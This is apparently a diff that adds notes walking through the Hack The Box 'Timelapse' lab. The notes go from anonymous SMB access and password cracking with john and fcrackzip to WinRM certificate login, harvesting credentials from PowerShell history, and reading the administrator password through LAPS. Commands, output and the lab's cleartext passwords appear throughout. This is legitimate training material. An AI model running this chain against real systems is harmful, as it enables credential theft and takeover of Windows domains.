@@ -1,0 +1,163 @@
+Resources:
+https://forum.hackthebox.com/t/official-timelapse-discussion/254385/77
+https://aidenpearce369.github.io/htb/offsec/timelapse/
+
+Walkthrough:
+
+$nmap--->see nmap output
+$ smbclient -N -L \\\\10.10.11.152
+$ smbclient \\\\10.10.11.152\\Shares
+
+smb: \Dev\> get winrm_backup.zip 
+#There was this zip which was accesible for anyone
+
+$ fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt 
+PASSWORD FOUND!!!!: pw == supremelegacy
+#The zip was protected by a password which we were able to crack with fcrackzip
+
+$sudo unzip winrm_backup.zip
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+replace legacyy_dev_auth.pfx? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
+  inflating: legacyy_dev_auth.pfx    
+
+$pfx2john legacyy_dev_auth.pfx                                  
+#I think this file was encryted
+$(root) pfx2john legacyy_dev_auth.pfx > pfx_timelapse.hash
+#The .hash file is the one we are going to crack
+$(root) john -w=/usr/share/wordlists/rockyou.txt pfx_timelapse.hash --rule /usr/share/john/rules/rockyou-30
+000.rule 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:02:44 DONE (2022-07-22 17:19) 0.006071g/s 19618p/s 19618c/s 19618C/s thuglife06..thug211
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+$(root) openssl pkcs12 -in legacyy_dev_auth.pfx  -nocerts -out priv-key.pem -nodes
+Enter Import Password: thuglegacy
+$(root) openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem  
+Enter Import Password: thuglegay
+#Now we have 2 .pem files (key and certificate)
+#Next step is to copy the key and certificate form those files into 2 new files .key and .cert respectively
+
+$ evil-winrm -S -k legacy.key -c legacy.cert -i 10.10.11.152
+#We got user.txt
+
+PS: net user legacyy <--username
+PS: whoami /user
+PS: whoami /priv
+#Check current user's privileges
+#Apparently when uploading WinPeass it shows PowerShell history file as possible attack vector but I wasn't able to transfer the file to the machine
+
+PS: echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
+
+	C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+
+PS: cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
+PS: cat ConsoleHost_history.txt
+
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck  <------------#First
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force <-----------#Second
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) <---------#Third
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+
+#Now we execute the marked commands in the prompt in that order (ctrl+c and ctrl+v)
+#Everytime we want to execute a command with a more privileged user we use the following command:
+# PS: invoke-command -computername localhost -credential $c -port 5986 -usessl -
+# SessionOption $so -scriptblock {whoami <----#command we want to execute}
+#We check the privileges of this new user and we  find this:
+PS: invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
+
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12:12:37 PM
+Password expires             Never
+Password changeable          10/26/2021 12:12:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   4/18/2022 9:12:42 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+
+#So this user svc_deploy is a member of LAPS_Readers group using which we can extract Local Administrator password
+PS: invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
+
+PSComputerName              : localhost
+RunspaceId                  : 2e2b6d90-dd50-4276-a5ea-c29fb9df32d9
+DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                 : dc01.timelapse.htb
+Enabled                     : True
+ms-Mcs-AdmPwd               : b}1;qx7&tr}yW!5X(6b,ir&6 <-------#Administrator's password
+ms-Mcs-AdmPwdExpirationTime : 133034260849623074
+Name                        : DC01
+ObjectClass                 : computer
+ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName              : DC01$
+SID                         : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName           :
+
+PSComputerName    : localhost
+RunspaceId        : 2e2b6d90-dd50-4276-a5ea-c29fb9df32d9
+DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : DB01
+ObjectClass       : computer
+ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
+SamAccountName    : DB01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1606
+UserPrincipalName :
+
+PSComputerName    : localhost
+RunspaceId        : 2e2b6d90-dd50-4276-a5ea-c29fb9df32d9
+DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : WEB01
+ObjectClass       : computer
+ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
+SamAccountName    : WEB01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1607
+UserPrincipalName :
+
+PSComputerName    : localhost
+RunspaceId        : 2e2b6d90-dd50-4276-a5ea-c29fb9df32d9
+DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : DEV01
+ObjectClass       : computer
+ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
+SamAccountName    : DEV01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1608
+UserPrincipalName :
+
+$ evil-winrm -u 'Administrator' -p 'b}1;qx7&tr}yW!5X(6b,ir&6' -i 10.10.11.152 -S
+#We connect to the machine as Administrator and find root.txt
